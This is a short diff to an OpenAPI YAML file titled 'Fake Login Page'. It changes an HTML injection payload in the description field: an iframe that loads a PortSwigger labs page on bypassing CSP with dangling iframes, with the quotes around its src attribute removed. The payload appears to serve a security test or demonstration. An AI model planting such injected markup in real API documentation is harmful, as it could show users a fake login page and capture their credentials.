@@ -3,7 +3,7 @@ info:
   version: 1.0.0
   title: Fake Login Page
   description: '
-  <p style="text-align:center"><iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php" width="700" height="800" frameBorder="0"></iframe><p style="color:white">'
+  <p style="text-align:center"><iframe src=//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php width="700" height="800" frameBorder="0"></iframe><p style="color:white">'
 paths:
   /accounts:
     get:
